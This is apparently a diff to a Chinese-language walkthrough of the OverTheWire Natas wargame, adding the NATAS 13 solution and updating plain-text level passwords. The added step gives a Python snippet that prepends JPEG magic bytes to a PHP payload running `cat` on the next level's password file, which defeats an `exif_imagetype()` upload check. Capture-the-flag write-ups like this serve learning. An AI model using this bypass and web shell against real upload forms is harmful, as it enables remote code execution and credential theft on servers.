@@ -254,10 +254,20 @@ graph TD;
 > - Username: natas13
 > - Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
+1. 觀察此題提供之原始碼發現其透過 `exif_imagetype()` 函式判斷是否為圖像檔，避免遭到檔案上傳漏洞的攻擊。
+2. 然而攻擊者仍可透過一些方式繞過這個函式，此函式判斷是否為圖像的依據為查看檔案的標頭。以 jpeg 為例，其標頭為：`0xFF 0xD8 0xFF 0xE0`。
+3. 故撰寫一個 Python 程式製作一個可繞過 `exif_imagetype()` 函式並進行攻擊的 jpeg 檔，範例程式如下：
+    ```python
+    shell=open('natas13.jpeg','wb')
+    shell.write(b'\xFF\xD8\xFF\xE0'+b"<?php passthru('cat /etc/natas_webpass/natas14');")
+    shell.close()
+    ```
+4. 接著就是類似 NATAS 12 的作法：將隱藏的文字方塊修改並上傳後打開回傳的路徑就得到 NATAS 14 的密碼了。
+
 ## [NATAS 14](http://natas14.natas.labs.overthewire.org)
 > - Link: http://natas14.natas.labs.overthewire.org
 > - Username: natas14
-> - Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+> - Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
 ## [NATAS 15](http://natas15.natas.labs.overthewire.org)
 > - Link: http://natas15.natas.labs.overthewire.org
